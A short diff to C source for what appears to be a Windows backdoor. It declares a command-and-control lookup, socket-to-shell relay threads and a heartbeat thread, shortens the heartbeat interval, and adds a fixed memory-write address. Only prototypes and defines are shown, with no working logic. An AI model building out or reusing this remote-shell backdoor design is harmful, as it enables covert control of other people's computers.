@@ -20,7 +20,9 @@
 #define BIND_SPLIT_RANDOM_RANGE (2)	// 两次 bind 操作之间的间隔
 #define DEFAULT_BUFLEN (44) // must larger than lenth "wassup000.000.000.000:00000wassup"
 #define DEFAULT_PORT (80)
-#define HEART_BEAT_SPLIT (60) // 线程互斥心跳检测间隔
+#define HEART_BEAT_WRITE_MEMORY
+#define HEART_BEAT_ADDRESS (0x1ff00)
+#define HEART_BEAT_SPLIT (4) // 心跳间隔
 
 #ifdef _DEBUG_PRINT_
 	#define MESSAGEBOX( ... ) MessageBox( __VA_ARGS__ )
@@ -52,7 +54,9 @@ void GetCCInfo( char* address ) ; // DONE
 BOOLEAN CheckAddress( char* address ) ; // DONE
 DWORD WINAPI ClientSocketToShell(LPVOID lpParameter) ; // copy from stackoverflow.com
 DWORD WINAPI ShellToClientSocket(LPVOID lpParameter) ; // copy from stackoverflow.com
+#ifdef HEART_BEAT_WRITE_MEMORY
 DWORD WINAPI HeartBeatThread( LPVOID lpParam ) ;
+#endif
 BOOL CheckHeartBeat( ) ;
 
 typedef struct _sThreadInfo
